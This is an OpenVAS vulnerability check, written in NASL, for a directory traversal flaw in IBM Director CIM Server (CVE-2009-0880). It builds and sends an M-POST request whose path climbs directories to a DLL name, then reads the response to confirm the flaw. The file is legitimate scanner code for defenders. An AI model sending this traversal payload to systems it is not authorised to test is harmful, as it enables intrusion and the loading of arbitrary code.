###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ibm_director_cimlistener_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# IBM Director CIM Server CIMListener Directory Traversal Vulnerability (Windows)
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to traverse the file
  system and specify any library on the system.
  Impact Level: Application";
tag_affected = "IBM Director version 5.20.3 Service Update 1 and prior";
tag_insight = "The flaw is due to error in IBM Director CIM Server, which allow remote
  attackers to load and execute arbitrary local DLL code via a .. (dot dot)
  in a /CIMListener/ URI in an M-POST request.";
tag_solution = "Upgrade to IBM Director version 5.20.3 Service Update 2 or later,
  https://www14.software.ibm.com/webapp/iwm/web/reg/download.do?source=dmp&S_PKG=director_x_520&S_TACT=sms&lang=en_US&cp=UTF-8";
tag_summary = "The host is running IBM Director CIM Server and is prone to
  directory traversal vulnerability.";

if(description)
{
  script_id(802684);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2009-0880");
  script_bugtraq_id(34065);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-11 20:37:46 +0530 (Tue, 11 Dec 2012)");
  script_name("IBM Director CIM Server CIMListener Directory Traversal Vulnerability (Windows)");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for the affected IBM Director software on Windows");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("os_fingerprint.nasl");
  script_require_ports("Services/www", 6988);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://osvdb.org/52616");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/34212");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/23074/");
  script_xref(name : "URL" , value : "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20090305-2_IBM_director_privilege_escalation.txt");
  script_xref(name : "URL" , value : "https://www14.software.ibm.com/webapp/iwm/web/reg/download.do?source=dmp&amp;S_PKG=director_x_520&amp;S_TACT=sms&amp;lang=en_US&amp;cp=UTF-8");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("version_func.inc");

# variable initialization
cimPort = 0;
sndReq = "";
rcvRes = "";

## exit, if its not Windows
if(host_runs("Windows") != "yes")exit(0);

## get the port
if(!cimPort = get_http_port(default:6988)) cimPort = 6988;

## check the port state
if(!get_port_state(cimPort))exit(0);

## xmlscript
xmlscript = string(
'<?xml version="1.0" encoding="utf-8" ?>' +
'<CIM CIMVERSION="2.0" DTDVERSION="2.0">' +
' <MESSAGE ID="1007" PROTOCOLVERSION="1.0">' +
'  <SIMPLEEXPREQ>' +
'    <EXPMETHODCALL NAME="ExportIndication">' +
'     <EXPPARAMVALUE NAME="NewIndication">' +
'      <INSTANCE CLASSNAME="CIM_AlertIndication" >' +
'        <PROPERTY NAME="Description" TYPE="string">' +
'          <VALUE>Sample CIM_AlertIndication indication</VALUE>' +
'        </PROPERTY>' +
'      </INSTANCE>' +
'    </EXPPARAMVALUE>' +
'  </EXPMETHODCALL>' +
' </SIMPLEEXPREQ>' +
' </MESSAGE>' +
'</CIM>');

## construct IBM Director M-POST request
sndReq = string("M-POST /CIMListener/\\..\\..\\..\\..\\..\\mydll HTTP/1.1\r\n" ,
                "Host: " , get_host_name() , "\r\n" ,
                "Content-Type: application/xml; charset=utf-8\r\n" ,
                "Content-Length: " , strlen(xmlscript) , "\r\n" ,
                "Man: http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40\r\n" ,
                "CIMOperation: MethodCall\r\n" ,
                "CIMExport: MethodRequest\r\n" ,
                "CIMExportMethod: ExportIndication\r\n",
                "\r\n" , xmlscript , "\r\n");

## send request and get response
rcvRes = http_send_recv(port:cimPort, data:sndReq);

## check response to confirm the vulnerability
if(rcvRes && rcvRes =~ "HTTP\/1\.[0-9] 200 OK" && "CIMExport: " >< rcvRes &&
   "Cannot load module " >< rcvRes && "Unknown exception" >< rcvRes &&
   "Cannot initialize consumer due to security restrictions" >!< rcvRes &&
   "Cannot load outside cimom/bin" >!< rcvRes && "CIM CIMVERSION=" >< rcvRes)
{
  security_hole(cimPort);
  exit(0);
}
